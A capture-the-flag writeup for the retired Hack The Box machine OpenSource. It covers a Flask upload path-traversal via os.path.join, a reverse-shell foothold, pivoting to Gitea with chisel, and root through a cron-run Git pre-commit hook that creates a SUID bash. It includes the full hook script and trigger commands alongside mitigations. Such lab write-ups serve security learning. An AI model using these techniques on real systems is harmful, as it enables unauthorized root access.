---
machine: OpenSource
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, flask, path-join, docker, gitea, git-hooks]
---

# OpenSource — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site allows downloading `source.zip` and uploading files. `os.path.join` discards previous paths when the name is absolute, so writes escape `uploads`. Overwrite a Flask view and run code as root in the container. From there access Gitea on the host, recover `dev01`'s SSH key, and a Git hook run by a root cron yields a SUID shell.

## Recon

```bash
nmap -Pn -sCV -p22,80,3000 <IP>
```

- `22/tcp` OpenSSH on Ubuntu 18.04, `80/tcp` Flask and `3000/tcp` Gitea.
- The site has `/download` for source code and `/upcloud` for uploads.
- The downloaded code includes `.git`, a `Dockerfile` and supervisord configuration.

## Enumeration

- `source.zip` reveals the application runs as root in a container.
- `get_file_name` strips `../`, but not a leading slash.
- `os.path.join(cwd, "public", "uploads", "/app/app/views.py")` returns `/app/app/views.py`.

## Foothold

Upload a file named `/app/app/views.py` with a view that runs a reverse shell, then visit the route to trigger it.

```bash
# In Burp, change filename to /app/app/views.py
curl http://<IP>/0xdf
nc -lnvp 443
```

## Lateral movement

The container reaches Gitea at `172.17.0.1:3000`. Use `chisel` to expose it and log in with `dev01` credentials; the `home-backup` repository contains the private SSH key. The key provides `dev01` access on the host.

## Privilege escalation

A root cron runs `/usr/local/bin/git-sync` in `dev01`'s home, which runs `git commit` and `git push`. Write a `pre-commit` hook that copies `/bin/bash` and sets SUID; the cron runs it as root.

```bash
echo -e '#!/bin/bash
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash' > ~/.git/hooks/pre-commit
chmod +x ~/.git/hooks/pre-commit
/tmp/rootbash -p
```

## Evidence

- `source.zip` and absolute path in the upload.
- Root shell in the container and Gitea exposed with chisel.
- `dev01` key and `pre-commit` hook executed by cron.

## Lessons learned

- `os.path.join` with an absolute path ignores previous components.
- A root container with mounted code allows application modification.
- Git hooks run during automated operations and can be abused.

## Mitigation and detection

- Normalize and confine upload paths; reject absolute names.
- Run containers as non-root with read-only code.
- Review hooks and cron jobs running Git as root.

## References

- [0xdf — OpenSource](https://0xdf.gitlab.io/2022/10/08/htb-opensource.html)
- [IppSec — OpenSource](https://www.youtube.com/watch?v=z6nJNr8AFTU)
- [Hack The Box — OpenSource](https://app.hackthebox.com/machines/opensource)
